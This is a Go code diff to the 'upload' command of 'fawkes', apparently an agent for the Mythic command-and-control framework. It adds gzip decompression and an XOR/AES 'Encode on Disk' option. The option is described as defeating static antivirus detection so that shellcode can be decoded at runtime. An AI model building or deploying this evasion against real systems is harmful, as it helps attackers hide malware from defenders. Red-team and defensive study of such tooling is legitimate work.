@@ -2,6 +2,7 @@ package agentfunctions
 
 import (
 	"fmt"
+	"path/filepath"
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
@@ -12,10 +13,14 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "upload",
-		Description:         "Upload a file to the target system",
-		HelpString:          "upload",
-		Version:             1,
-		MitreAttackMappings: []string{"T1020", "T1030", "T1041", "T1105"},
+		AssociatedBrowserScript: &agentstructs.BrowserScript{
+			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "upload_new.js"),
+			Author:     "@galoryber",
+		},
+		Description:         "Upload a file to the target system (optional encoding or auto-decompression)",
+		HelpString:          "upload — supports XOR/AES encoding (for AV evasion on disk) and gzip decompression",
+		Version:             4,
+		MitreAttackMappings: []string{"T1020", "T1030", "T1041", "T1105", "T1027"},
 		SupportedUIFeatures: []string{"file_browser:upload"},
 		Author:              "@galoryber",
 		CommandAttributes: agentstructs.CommandAttribute{
@@ -31,6 +36,7 @@ func init() {
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: true,
+						GroupName:           "Default",
 						UIModalPosition:     1,
 					},
 				},
@@ -44,6 +50,7 @@ func init() {
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
+						GroupName:           "Default",
 						UIModalPosition:     2,
 					},
 				},
@@ -57,7 +64,37 @@ func init() {
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
+						GroupName:           "Default",
 						UIModalPosition:     3,
+					},
+				},
+			},
+			{
+				Name:             "decompress",
+				ModalDisplayName: "Auto-Decompress (gzip)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Automatically decompress gzip-compressed files after transfer. Use with compressed downloads for bandwidth-efficient round-trip.",
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     4,
+					},
+				},
+			},
+			{
+				Name:             "encode",
+				ModalDisplayName: "Encode on Disk",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:      "Encode the file before writing to disk (XOR or AES-256-CTR). Prevents static AV detection of file contents. A random key is generated and returned — use it with execute-shellcode to decode at runtime.",
+				DefaultValue:     "",
+				Choices:          []string{"", "xor", "aes"},
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     5,
 					},
 				},
 			},
